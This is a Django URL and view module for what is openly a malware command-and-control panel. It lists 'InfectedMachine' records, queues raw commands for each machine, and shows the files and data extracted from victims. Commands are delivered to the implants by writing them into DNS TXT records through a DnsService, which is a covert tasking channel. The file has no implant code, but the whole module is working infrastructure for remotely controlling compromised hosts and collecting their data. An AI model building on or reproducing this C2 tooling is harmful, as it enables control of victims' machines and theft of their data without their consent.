"""
URL configuration for djangoproject project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/6.0/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
import os

from decouple import config
from django.conf import settings
from django.http import HttpRequest
from django.shortcuts import render, redirect
# from django.contrib import admin
from django.urls import include, path
from django.views.decorators.http import require_POST

from .models import InfectedMachine, Job
from .services.DnsService import DnsService


def index(request: HttpRequest):
    return render(request, "index.html", {
        "machinesCount": InfectedMachine.objects.count(),
        "jobsCount": Job.objects.count(),
    })

def machines(request: HttpRequest):
    return render(request, "machines.html", {
        "machines": InfectedMachine.objects.order_by('-created_at').all(),
    })

def jobs(request: HttpRequest):
    filter_machine_id = request.GET.get('machine_id', None)
    if filter_machine_id:
        jobs = Job.objects.filter(infected_machine=filter_machine_id).order_by('-created_at').all()
    else:
        jobs = Job.objects.order_by('-created_at').all()

    return render(request, "jobs.html", {
        "jobs": jobs,
        "filter_machine_id": filter_machine_id,
    })

def show_job_extracted(request: HttpRequest, job_id: int):
    job = Job.objects.filter(id=job_id).first()
    if job is None:
        return redirect('jobs')

    files_tree = file_tree(job.data_folder_path())

    extracted = 'No file yet'
    if os.path.isfile(job.extracted_file_path()):
        with open(job.extracted_file_path(), 'r') as f:
            extracted = f.read()

    return render(request, "job_extracted.html", {
        "job": job,
        "files_tree": files_tree,
        "extracted": extracted
    })

@require_POST
def job_create(request: HttpRequest, machine_id: int):
    machine = InfectedMachine.objects.filter(id=machine_id).first()
    raw_command = request.POST.get('command')
    if machine is None or raw_command is None or machine.get_current_job() is not None:
        return redirect('machines')

    new_job = machine.job_set.create()
    new_job.raw_command = raw_command
    new_job.save()

    DnsService().set_job_txt(machine, raw_command).apply()

    return redirect('machines')

@require_POST
def job_delete(_: HttpRequest, job_id: int):
    job = Job.objects.filter(id=job_id).first()
    if job is not None:
        current_machine_job = job.infected_machine.get_current_job()
        if current_machine_job is not None and current_machine_job.id == job.id:
            DnsService().remove_job_txt(job.infected_machine)
        job.delete()

    return redirect('jobs')

def debug(request: HttpRequest):
    dns_pointer = 'Fichier inexistant'
    dns_pointer_path = config('DNS_POINTER_FILE', '')
    if os.path.isfile(dns_pointer_path):
        with open(dns_pointer_path, 'r') as f:
            dns_pointer = f.read()

    data_folder_tree = 'Dossier inexistant'
    data_folder_path = config('FOLDER_DATA', '')
    if os.path.exists(data_folder_path):
        data_folder_tree = file_tree(data_folder_path)

    dns_service = DnsService()
    dns_zone = dns_service.print_zone()

    return render(request, "debug.html", {
        "dns_pointer": dns_pointer,
        "data_folder_tree": data_folder_tree,
        "dns_zone": dns_zone,
    })

def file_tree(folder_path: str, prefix="") -> str:
    result = f"{folder_path}\n"
    entries = sorted(os.scandir(folder_path), key=lambda e: (not e.is_dir(), e.name))
    for i, entry in enumerate(entries):
        connector = "└── " if i == len(entries) - 1 else "├── "
        result += prefix + connector + entry.name + ("/" if entry.is_dir() else "") + "\n"
        if entry.is_dir():
            extension = "    " if i == len(entries) - 1 else "│   "
            result += file_tree(entry.path, prefix + extension)
    return result

urlpatterns = [
    #    path('admin/', admin.site.urls),
    path('', index, name='index'),
    path('machines', machines, name='machines'),
    path('jobs', jobs, name='jobs'),
    path('debug', debug, name='debug'),
    path('job/create/<int:machine_id>', job_create, name='job_create'),
    path('job/delete/<int:job_id>', job_delete, name='job_delete'),
    path('job/show-extracted/<int:job_id>', show_job_extracted, name='show_job_extracted'),
]
if settings.DEBUG:
    # Include django_browser_reload URLs only in DEBUG mode
    urlpatterns += [
        path("__reload__/", include("django_browser_reload.urls")),
    ]
